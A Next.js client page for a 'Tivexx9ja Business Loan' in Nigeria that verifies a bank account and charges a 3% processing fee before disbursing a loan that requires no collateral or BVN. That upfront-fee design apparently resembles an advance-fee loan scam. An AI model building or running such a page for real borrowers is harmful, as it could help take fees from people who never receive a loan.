"use client"

import { useState, useEffect } from "react"
import { useRouter } from "next/navigation"
import { ArrowLeft, CheckCircle, Globe } from "lucide-react"
import { Button } from "@/components/ui/button"
import { Card } from "@/components/ui/card"
import { Input } from "@/components/ui/input"
import { Label } from "@/components/ui/label"
import {
  Select,
  SelectContent,
  SelectItem,
  SelectTrigger,
  SelectValue,
} from "@/components/ui/select"

export default function BusinessLoanPage() {
  const router = useRouter()
  const [loanAmount, setLoanAmount] = useState("")
  const [accountNumber, setAccountNumber] = useState("")
  const [selectedBank, setSelectedBank] = useState("")
  const [accountName, setAccountName] = useState("")
  const [error, setError] = useState<string | null>(null)
  const [submitting, setSubmitting] = useState(false)
  const [banksList, setBanksList] = useState<Array<{ name: string; code: string }>>([])
  const [bankCode, setBankCode] = useState("")
  const [verifying, setVerifying] = useState(false)
  const [verified, setVerified] = useState(false)
  const [verifyError, setVerifyError] = useState<string | null>(null)

  const banks = [
    "Access Bank", "GTBank", "First Bank", "UBA", "Zenith Bank", "Fidelity Bank", "Union Bank", "Sterling Bank",
    "Stanbic IBTC", "Palmpay", "Opay", "Kuda Bank", "Ecobank", "FCMB", "Keystone Bank", "Heritage Bank",
    "Polaris Bank", "Providus Bank", "Titan Trust Bank", "Globus Bank", "SunTrust Bank", "Rubies Bank",
    "Parallex Bank", "FSDH Merchant Bank", "Renmoney Bank", "FairMoney Bank", "MintMFB", "Paycom MFB",
    "Mkobo MFB", "Diamond Bank", "Citibank Nigeria", "Wema Bank", "GTCO (Legacy)"
  ]

  const MIN_LOAN = 500000
  const MAX_LOAN = 5000000
  const PROCESSING_RATE = 0.03

  const numericValue = (val: string) => {
    const n = Number(val.toString().replace(/[^0-9.]/g, ""))
    return isNaN(n) ? 0 : n
  }

  const formatCurrency = (n: number) =>
    new Intl.NumberFormat("en-NG", { style: "currency", currency: "NGN", minimumFractionDigits: 0 })
      .format(n)
      .replace("NGN", "₦")

  const handleContinue = () => {
    setError(null)
    const loanAmountNum = Math.floor(numericValue(loanAmount))

    if (!loanAmount || !accountNumber || !selectedBank || !accountName) {
      setError("Please fill in all required fields.")
      return
    }

    if (accountNumber.replace(/\D/g, "").length !== 10) {
      setError("Please enter a valid 10-digit account number.")
      return
    }

    if (loanAmountNum < MIN_LOAN || loanAmountNum > MAX_LOAN) {
      setError(`Loan amount must be between ${formatCurrency(MIN_LOAN)} and ${formatCurrency(MAX_LOAN)}.`)
      return
    }

    const fee = Math.ceil(loanAmountNum * PROCESSING_RATE)
    const url = new URL("/withdraw/bank-transfer", window.location.origin)
    url.searchParams.set("amount", fee.toString())
    url.searchParams.set("loanAmount", loanAmountNum.toString())
    url.searchParams.set("accountNumber", accountNumber.replace(/\D/g, ""))
    url.searchParams.set("selectedBank", selectedBank)
    url.searchParams.set("accountName", accountName)
    setSubmitting(true)
    setTimeout(() => {
      router.push(url.toString())
    }, 450)
  }

  // Fetch banks from server (Paystack)
  useEffect(() => {
    let mounted = true
    ;(async () => {
      try {
        const res = await fetch(`/api/banks`)
        if (!res.ok) return
        const data = await res.json()
        if (mounted && data && data.banks) setBanksList(data.banks)
      } catch (err) {
        // ignore
      }
    })()
    return () => {
      mounted = false
    }
  }, [])

  async function verifyAccount() {
    setVerifyError(null)
    setVerifying(true)
    try {
      // require bankCode for Paystack verify
      if (!bankCode) {
        setVerifyError("Please select your bank from the list to verify")
        setVerified(false)
        return
      }

      const res = await fetch(`/api/verify-account`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ account_number: accountNumber.replace(/\D/g, ""), bank_code: bankCode }),
      })
      const data = await res.json()
      if (!res.ok || data.error) {
        setVerifyError(data.error || "Failed to verify account")
        setVerified(false)
      } else {
        const resolvedName = data.account_name || data.data?.account_name || ""
        setAccountName(resolvedName)
        setVerified(true)
      }
    } catch (err) {
      setVerifyError("Failed to verify account")
      setVerified(false)
    } finally {
      setVerifying(false)
    }
  }

  // Auto-verify when user types full 10-digit account and a bank is selected
  useEffect(() => {
    const cleaned = accountNumber.replace(/\D/g, "")
    if (cleaned.length === 10 && bankCode) {
      const t = setTimeout(() => verifyAccount(), 300)
      return () => clearTimeout(t)
    }
  }, [accountNumber, bankCode])

  return (
    <div className="min-h-screen text-white bg-gradient-to-br from-emerald-800 via-emerald-700 to-emerald-900">
      {/* Subtle glow background */}
      <div className="absolute inset-0 -z-10 bg-gradient-to-tr from-[#065f46]/40 via-[#10b981]/20 to-[#064e3b]/50"></div>

      <div className="max-w-3xl mx-auto px-4 py-8">
        {/* Header */}
        <div className="flex items-center gap-4 mb-6">
          <Button variant="ghost" size="sm" onClick={() => router.back()} className="text-white/90 hover:bg-white/10 p-2 rounded-lg">
            <ArrowLeft className="h-5 w-5" />
          </Button>
          <div>
            <h1 className="text-4xl font-extrabold leading-tight tracking-tight drop-shadow-[0_6px_20px_rgba(16,185,129,0.25)]">
              Tivexx9ja Business Loan
            </h1>
            <p className="text-sm text-white/80 mt-1">Fast disbursement • One-time processing fee • Repayment: 12 months</p>
          </div>
        </div>

        <main className="space-y-6">
          <Card className="p-6 rounded-3xl bg-white/10 backdrop-blur-lg border border-white/10 shadow-2xl">
            <div className="flex items-start gap-4">
              <div className="p-3 rounded-full bg-gradient-to-br from-emerald-400 to-amber-400 text-black shadow-md">
                <CheckCircle className="h-6 w-6" />
              </div>
              <div>
                <h3 className="text-lg font-bold">Loan Overview</h3>
                <p className="text-sm text-white/80 mt-2">
                  Borrow between <span className="font-semibold text-emerald-300">{formatCurrency(MIN_LOAN)}</span> and{" "}
                  <span className="font-semibold text-emerald-300">{formatCurrency(MAX_LOAN)}</span>. A one-time processing
                  fee of <span className="font-semibold text-amber-300">3%</span> is required and will be charged now.
                </p>
                <p className="mt-3 text-sm text-white/70">Repayment: <span className="font-semibold">12 months</span>. No collateral or BVN required.</p>
              </div>
            </div>
          </Card>

          <Card className="p-6 rounded-3xl bg-white/10 backdrop-blur-lg border border-white/10 shadow-2xl">
            <h2 className="text-2xl font-bold mb-4">Apply for Business Loan</h2>

            <div className="grid grid-cols-1 gap-4">
              <div>
                <Label htmlFor="loanAmount" className="text-sm text-white/80">Loan Amount (₦)</Label>
                <Input
                  id="loanAmount"
                  type="number"
                  min={MIN_LOAN}
                  max={MAX_LOAN}
                  placeholder="Enter amount between 500,000 and 5,000,000"
                  value={loanAmount}
                  onChange={(e) => setLoanAmount(e.target.value)}
                  className="mt-2 h-12 bg-white/10 text-white placeholder:text-white/60"
                />
              </div>

              

              <div>
                <Label className="text-sm text-white/80">Select Bank</Label>
                <Select
                  value={bankCode || selectedBank}
                  onValueChange={(val) => {
                    // If we have a fetched banks list, val will be bank code
                    const found = banksList.find((x) => x.code === val)
                    if (found) {
                      setSelectedBank(found.name)
                      setBankCode(found.code)
                    } else {
                      // fallback when using built-in banks list
                      setSelectedBank(val)
                      setBankCode("")
                    }
                    setVerified(false)
                    setVerifyError(null)
                  }}
                >
                  <SelectTrigger className="mt-2 h-12 bg-gradient-to-r from-green-700 via-purple-800 to-green-700 text-white border border-white/20">
                    <SelectValue placeholder="Choose your bank" />
                  </SelectTrigger>
                  <SelectContent className="text-white bg-gradient-to-b from-green-900 via-purple-900 to-green-900 border border-white/20 max-h-60 overflow-y-auto">
                    {banksList.length
                      ? banksList.map((b) => (
                          <SelectItem key={b.code} value={b.code}>
                            {b.name}
                          </SelectItem>
                        ))
                      : banks.map((b) => (
                          <SelectItem key={b} value={b}>
                            {b}
                          </SelectItem>
                        ))}
                  </SelectContent>
                </Select>
              </div>
              <div>
                <Label htmlFor="accountNumber" className="text-sm text-white/80">Account Number</Label>
                <div className="flex gap-2 mt-2">
                  <Input
                    id="accountNumber"
                    type="text"
                    placeholder="10-digit account number"
                    value={accountNumber}
                    onChange={(e) => {
                      const v = e.target.value.replace(/\D/g, "")
                      if (v.length <= 10) setAccountNumber(v)
                      setVerified(false)
                      setVerifyError(null)
                    }}
                    className="flex-1 h-12 bg-white/10 text-white placeholder:text-white/60"
                    maxLength={10}
                  />

                  <button
                    type="button"
                    onClick={async () => {
                      if (accountNumber.replace(/\D/g, "").length !== 10) return
                      await verifyAccount()
                    }}
                    disabled={accountNumber.replace(/\D/g, "").length !== 10 || verifying}
                    className={`px-4 py-2 rounded-lg text-white font-semibold transition ${
                      accountNumber.replace(/\D/g, "").length !== 10
                        ? "bg-white/20 cursor-not-allowed"
                        : "bg-green-600 hover:bg-green-700"
                    }`}
                  >
                    {verifying ? "Verifying..." : "Verify"}
                  </button>
                </div>
                {verifyError && <div className="mt-2 text-sm text-red-300">{verifyError}</div>}
              </div>

              <div>
                <Label htmlFor="accountName" className="text-sm text-white/80">
                  Account Name
                  {verified && <span className="ml-2 inline-block bg-green-100 text-green-800 text-xs px-2 py-1 rounded text-black">Verified ✓</span>}
                </Label>
                <Input
                  id="accountName"
                  placeholder="Account holder name"
                  value={accountName}
                  onChange={(e) => {
                    if (!verified) setAccountName(e.target.value)
                  }}
                  disabled={verified}
                  className={`mt-2 h-12 ${
                    verified ? "bg-green-50 text-green-900" : "bg-white/10 text-white"
                  } placeholder:text-white/60`}
                />
                {verified && <p className="text-sm text-green-200 mt-2">Resolved from bank lookup</p>}
              </div>

            <div className="mt-6">
              <Button
                onClick={handleContinue}
                className="w-full py-4 rounded-xl text-lg font-bold bg-gradient-to-r from-purple-800 via-purple-600 to-emerald-500 hover:from-purple-700 hover:to-emerald-600 transform transition-all shadow-2xl"
                disabled={submitting}
              >
                {submitting ? "Redirecting to Payment..." : "Continue to Processing Fee"}
              </Button>
            </div>

            <p className="mt-4 text-xs text-white/70">Note: The 3% processing fee will be charged now. You will be redirected to complete the payment.</p>
          </Card>
        </main>
      </div>
    </div>
  )
}